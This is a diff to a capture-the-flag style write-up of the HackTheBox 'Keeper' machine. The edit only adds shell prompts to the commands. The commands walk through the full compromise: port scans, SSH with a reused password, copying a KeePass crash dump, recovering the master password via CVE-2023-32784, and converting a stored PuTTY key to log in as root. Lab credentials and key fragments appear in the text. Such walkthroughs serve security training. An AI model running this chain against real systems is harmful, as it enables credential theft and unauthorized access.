@@ -22,8 +22,8 @@ Target was `10.10.11.227`.
 I started with a full TCP sweep, then ran scripts and version detection against the open ports.
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.227
-nmap -p 22,80 -sCV 10.10.11.227
+$ nmap -p- --min-rate 10000 10.10.11.227
+$ nmap -p 22,80 -sCV 10.10.11.227
 ```
 
 Two ports answered:
@@ -100,14 +100,14 @@ There was also a ticket on the box describing a KeePass crash. lnorgaard had bee
 Password reuse did the rest. `Welcome2023!` worked for SSH:
 
 ```bash
-ssh lnorgaard@keeper.htb   # Welcome2023!
+$ ssh lnorgaard@keeper.htb   # Welcome2023!
 ```
 
 lnorgaard owned `user.txt`. Her home directory also held `RT30000.zip`, an 84MB archive tied to the KeePass ticket. I pulled it down and unpacked it:
 
 ```bash
-scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
-unzip RT30000.zip
+$ scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
+$ unzip RT30000.zip
 ```
 
 It contained exactly the pair you want for the next CVE:
@@ -124,7 +124,7 @@ A KeePass crash dump sitting next to its `.kdbx` is the signature of **CVE-2023-
 I used the [keepass-password-dumper](https://github.com/CMEPW/keepass-dump-masterkey) carving tool against the dump. The .NET reference implementation is the original PoC:
 
 ```bash
-dotnet run KeePassDumpFull.dmp
+$ dotnet run KeePassDumpFull.dmp
 ```
 
 It printed one candidate per position, with the unknown first character as a set of options:
@@ -144,8 +144,8 @@ There is also a pure-Python carver in the same family if you would rather not pu
 I copied the database off the box and opened it locally. Either a GUI or the CLI works. With `kpcli`:
 
 ```bash
-scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
-kpcli --kdb passcodes.kdbx
+$ scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
+$ kpcli --kdb passcodes.kdbx
 # master password: rødgrød med fløde
 ```
 
@@ -163,9 +163,9 @@ AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
 OpenSSH cannot consume a `.ppk` directly, so I converted it to an OpenSSH private key with `puttygen` from the `putty-tools` package:
 
 ```bash
-puttygen keeper.txt -O private-openssh -o id_rsa
-chmod 600 id_rsa
-ssh root@keeper.htb -i id_rsa
+$ puttygen keeper.txt -O private-openssh -o id_rsa
+$ chmod 600 id_rsa
+$ ssh root@keeper.htb -i id_rsa
 ```
 
 That logged in as root and handed over `root.txt`.
